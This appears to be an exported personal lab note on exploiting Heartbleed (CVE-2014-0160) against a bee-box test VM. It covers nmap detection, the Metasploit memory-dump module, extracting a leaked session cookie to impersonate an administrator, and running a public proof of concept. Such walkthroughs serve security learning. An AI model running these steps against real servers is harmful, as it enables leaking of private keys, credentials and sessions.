<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Heartbleed (OpenSSL)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Heartbleed (OpenSSL)</h1><br /><a href=""><img src="images/1448-1.png"
        alt="images/1448-1.png" /></a><br /><br /><strong>
      <h3>Prerequisite:</h3>
    </strong><br />• Web Application Apache,<span style="color:#4d5156;"> </span>Nginx or other services that use an old
    version of OpenSSL<br />• OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable<br /> Bug was introduced to
    OpenSSL in December 2011 and has been out in the wild since OpenSSL release 1.0.1 on 14th of March 2012. OpenSSL
    1.0.1g released on 7th of April 2014 fixes the bug.<br /><br /><br /><strong>What is the
      CVE-2014-0160?</strong><br />CVE-2014-0160 is the official reference to this bug. CVE (Common Vulnerabilities and
    Exposures) is the Standard for Information Security Vulnerability Names maintained by <a
      href="http://cve.mitre.org/" target="_blank">MITRE</a>. <br /><br /><strong>Why it is called the Heartbleed Bug?</strong><br />Bug
    is in the OpenSSL&#39;s implementation of the TLS/DTLS (<a
      href="https://www.synopsys.com/software-integrity/security-testing/fuzz-testing/defensics.html" target="_blank">transport layer
      security protocols</a>) heartbeat extension (RFC6520). When it is exploited it leads to the leak of memory
    contents from the server to the client and from the client to the server. <br />Heartbleed allows a remote user to
    download 64KB chunks of RAM. The attacker may make repeated requests<br />to attempt to access different
    chunks<br />In addition to the “dumping” of arbitrary encrypted data from a server, which could include anything
    from credentials for the application and any other sensitive data that might reside in memory at any given moment,
    it also allowed for the dumping of the Private Key responsible for securing that data over SSL.<br /><br />0. Do a
    full scan of the target, Check the port of the open source web servers(in this case nginx)<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nmap&nbsp;-sV&nbsp;-A&nbsp;192.168.147.136</div>
    </div><br /> <a href=""><img src="images/1448-2.png" alt="images/1448-2.png" /></a><br /> Old versions of <span
      style="text-decoration:underline;">Apache</span> and <span style="text-decoration:underline;">nginx</span> can be
    vulnerable to the heartbleed bug, if they use an old version of OpenSSL<br />1. Test if the target is vulnerable to
    heartbleed<br /> ◇ nmap ssl-heartbleed.nse(https://nmap.org/nsedoc/scripts/ssl-heartbleed.html)<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nmap&nbsp;-p443--script&nbsp;ssl-heartbleed&nbsp;192.168.147.136</div>
    </div><br /> <a href=""><img src="images/1448-3.png" alt="images/1448-3.png" /></a><br /> <br />2. Exploit<br /> ◇
    Metasploit<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;msfconsole<br />msf&gt;&nbsp;use&nbsp;auxiliary/scanner/ssl/openssl_heartbleed<br />msf&gt;&nbsp;show&nbsp;actions<br />msf&gt;&nbsp;set&nbsp;action&nbsp;DUMP&nbsp;&nbsp;&nbsp;&nbsp;#<br />msf&gt;&nbsp;show&nbsp;options<br />msf&gt;&nbsp;set&nbsp;rhosts&nbsp;&lt;targetIp&gt;<br />msf&gt;&nbsp;set&nbsp;rport&nbsp;8443<br />msf&gt;&nbsp;exploit
      </div>
    </div><br /> <a href=""><img src="images/1448-4.png" alt="images/1448-4.png" /></a><br /> the results of the
    “leaked” data to a file in your ~/.msf4/loot directory as a .bin file<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;strings&nbsp;/root/.msf4/loot/20210514140513_default_192.168.147.136_openssl.heartble_137778.bin
      </div>
    </div><br /> <a href=""><img src="images/1448-5.png" alt="images/1448-5.png" /></a><br /> The PHPSESSID is been
    leaked, with it we can impersonate the WebApplication administrator user<br /> ◇ Sensepost heartbleed-poc (<a
      href="https://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py" target="_blank">https://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py</a>):<br />
    We can run it multiple times<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;wget&nbsp;https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py<br />root@kali:/#&nbsp;python&nbsp;heartbleed-poc.py&nbsp;[server]&nbsp;|&nbsp;less
      </div>
    </div><br /> <a href=""><img src="images/1448-6.png" alt="images/1448-6.png" /></a><br />Bibliography:<br />• <a
      href="https://heartbleed.com/" target="_blank">https://heartbleed.com/</a><br />• Test machine used with Heartbleed vulnerability:
    <a
      href="https://sourceforge.net/projects/bwapp/files/bee-box/" target="_blank">https://sourceforge.net/projects/bwapp/files/bee-box/</a><br />
    1) To use it we have to navigate via browser on the webapplication ip.<br /> 2) Login with user:bee password
    bug<br /> 3) Choose your bug → Heartbleed vulnerability<br /> 4) As the message say, navigate another time via
    browser on the webapplicationIP but this time on port 8443 (https://&lt;targetIP&gt;:8443)<br />• <a
      href="https://www.youtube.com/watch?v=SgJm0C6jzbo" target="_blank">https://www.youtube.com/watch?v=SgJm0C6jzbo</a> explanation on
    how to use the bee-box
  </div>
</body>

</html>